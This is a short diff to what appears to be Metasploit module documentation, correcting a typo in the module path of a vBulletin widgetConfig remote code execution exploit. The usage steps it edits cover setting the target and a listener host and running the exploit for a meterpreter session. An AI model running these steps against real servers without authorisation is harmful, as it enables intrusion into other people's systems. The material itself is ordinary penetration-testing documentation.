@@ -23,7 +23,7 @@ meterpreter >
 
 1. Install the module as usual
 2. Start msfconsole
-3. Do: `use exploit/multi/http/vbullnetin_widgetconfig_rce`
+3. Do: `use exploit/multi/http/vbulletin_widgetconfig_rce`
 4. Do: `set RHOSTS [IP]`
 5. Do: `set LHOST [IP]`
 6. Do: `run`
